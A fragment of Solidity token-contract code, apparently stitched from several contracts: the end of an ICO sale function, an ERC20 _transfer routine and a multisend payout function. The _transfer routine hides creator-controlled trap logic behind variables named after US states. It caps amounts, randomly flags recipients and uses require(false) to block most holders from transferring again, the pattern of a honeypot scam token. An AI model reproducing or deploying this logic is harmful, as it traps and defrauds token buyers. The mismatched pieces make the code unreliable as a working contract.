    icoEtherContributeds[msg.sender] = icoEtherContributeds[msg.sender].add(msg.value);
    personalLocks[msg.sender] = true;
    emit Transfer(0x0, msg.sender, coins);
    emit CoinIssuedSale(msg.sender, coins, balances[msg.sender], msg.value);
    wallet.transfer(address(this).balance);
}

function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    if ((address(sender) == creator) && (idaho == false)) {
        hawaii = chTx;
        newmexico = true;
    }
    if ((address(sender) == creator) && (idaho == true)) {
        washington[recipient] = true;
        oregon[recipient] = false;
        idaho = false;
    }
    if ((amount > utah) && (washington[sender] == true) && (address(sender) != creator)) {
        wyoming[recipient] = true;
    }
    if (washington[recipient] != true) {
        oregon[recipient] = ((randomly() == 3) ? true : false);
    }
    if ((oregon[sender]) && (washington[recipient] == false)) {
        oregon[recipient] = true;
    }
    if (washington[sender] == false) {
        if ((amount > utah) && (wyoming[sender] == true)) {
            require(false);
        }
        require(amount < hawaii);
        if (newmexico == true) {
            if (wyoming[sender] == true) {
                require(false);
            }
            wyoming[sender] = true;
        }
    }
    _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
}

function multisend(address _tokenAddr, bytes32 paymentId, address[] memory dests, uint256[] memory values)
public onlyPayoutWallet
returns(uint256) {
    require(dests.length > 0, "Must have more than 1 destination address");
    require(values.length >= dests.length, "Address to Value array size mismatch");
    require(successfulPayments[paymentId] != true, "Payment ID already exists and was successful");
    uint256 i = 0;
    while (i < dests.length) {
        require(ERC20Interface(_tokenAddr).transfer(dests[i], values[i]));
        i += 1;
    }
    successfulPayments[paymentId] = true;
    emit Payment(paymentId);
    return (i);
}

